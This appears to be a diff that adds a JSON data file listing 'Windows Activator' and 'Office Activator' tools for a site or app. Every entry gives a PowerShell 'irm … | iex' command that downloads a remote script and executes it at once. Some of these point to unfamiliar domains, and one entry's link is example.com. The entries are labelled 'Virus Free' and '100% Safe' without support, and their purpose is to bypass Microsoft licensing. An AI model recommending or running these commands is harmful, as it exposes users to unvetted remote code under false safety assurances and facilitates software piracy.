@@ -1,0 +1,20 @@
+[
+    {
+        "name": "Windows Activator",
+        "description": "This is a simple method for activating your Windows using PowerShell.",
+        "safe": "Virus Free",
+        "safeColor": "green",
+        "link": "https://github.com/massgravel/Microsoft-Activation-Scripts",
+        "command": "irm https://get.activated.win | iex",
+        "alternativeCommand": "irm https://massgrave.dev/get | iex"
+    },
+    {
+        "name": "Office Activator",
+        "description": "Use this method to activate Microsoft Office permanently.",
+        "safe": "100% Safe",
+        "safeColor": "blue",
+        "link": "https://example.com",
+        "command": "irm https://office.activation.win | iex",
+        "alternativeCommand": "irm https://backup.office.win | iex"
+    }
+]
